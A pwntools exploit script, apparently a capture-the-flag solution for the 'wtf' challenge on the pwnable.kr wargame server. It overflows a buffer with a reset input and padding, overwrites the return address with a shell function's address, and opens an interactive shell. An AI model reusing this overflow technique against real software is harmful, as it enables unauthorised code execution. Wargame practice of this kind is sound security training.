from pwn import *

exe = ELF("./wtf_patched")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.GDB:
            gdb.debug(r)
    else:
        r = remote("pwnable.kr", 9015)

    return r


def main():
    r = conn()

    shell = p64(0x4005f4)
    reset = b'-1' + b'\n' * 4094
    offset = 56

    r.recvuntil(' : ')

    payload = reset + b'A' * offset + shell + b'\n'
    r.sendline(payload.hex().encode())
    print(r.recv())
    r.interactive()

if __name__ == "__main__":
    main()
